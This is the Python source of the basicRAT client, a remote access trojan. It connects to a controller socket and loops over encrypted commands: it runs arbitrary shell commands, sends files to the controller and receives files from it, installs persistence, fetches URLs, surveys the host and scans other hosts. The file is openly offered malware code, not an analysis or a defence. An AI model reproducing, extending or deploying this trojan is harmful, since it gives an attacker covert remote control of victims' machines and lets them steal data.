#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import os
import socket
import subprocess
import sys

from core import crypto
from core import persistence
from core import scan
from core import survey
from core import toolkit
from core import common


PLAT = sys.platform
HOST = 'localhost'
PORT = 1337


def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    client = common.Client(s, HOST, 1)

    while True:
        results = ""
        data = client.recvGCM()
        if not data:
            continue

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'kill':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                if not os.path.isfile(fname):
                    continue

                client.sendfile(fname)
                continue

        # receive file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                if os.path.isfile(fname):
                    continue

                client.recvfile(fname)
                continue

        # # regenerate DH key
        # elif cmd == 'rekey':
        #     dh_key = crypto.diffiehellman(s)

        elif cmd == 'persistence':  results = persistence.run(PLAT)
        elif cmd == 'wget':         results = toolkit.wget(action)
        elif cmd == 'unzip':        results = toolkit.unzip(action)
        elif cmd == 'survey':       results = survey.run(PLAT)
        elif cmd == 'scan':         results = scan.single_host(action)

        client.sendGCM(results)


if __name__ == '__main__':
    main()
